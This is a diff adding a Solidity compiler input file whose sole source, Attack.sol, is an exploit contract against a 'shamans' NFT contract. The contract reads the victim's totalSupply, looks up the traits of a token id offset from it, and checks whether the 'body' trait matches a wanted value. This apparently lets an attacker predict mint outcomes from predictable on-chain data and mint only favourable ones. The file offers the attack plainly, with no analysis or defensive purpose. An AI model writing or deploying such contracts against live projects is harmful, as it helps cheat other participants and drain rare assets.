@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "Attack.sol": {
+      "content": "pragma solidity 0.8.7;\n\n\ninterface IVictim {\n    function totalSupply() external view returns (uint256);\n    function shamans(uint256 id) external view returns(uint16 level, uint32 lvlProgress, uint16 modF, uint8 skillCredits, uint8 body, uint8 featA, uint8 featB, uint8 helm, uint8 mainhand, uint8 offhand);\n}\ncontract Attack {\n    function attack(address victim,uint256 result) view public returns(bool ){\n        IVictim victimContract = IVictim(victim);\n        uint256 id = victimContract.totalSupply()+5050;  \n        (uint16 level, uint32 lvlProgress, uint16 modF, uint8 skillCredits, uint8 body, uint8 featA, uint8 featB, uint8 helm, uint8 mainhand, uint8 offhand) = victimContract.shamans(id);\n        \n        return (body==result) ;\n    }\n\n}\n\n"
+    }
+  }
+}
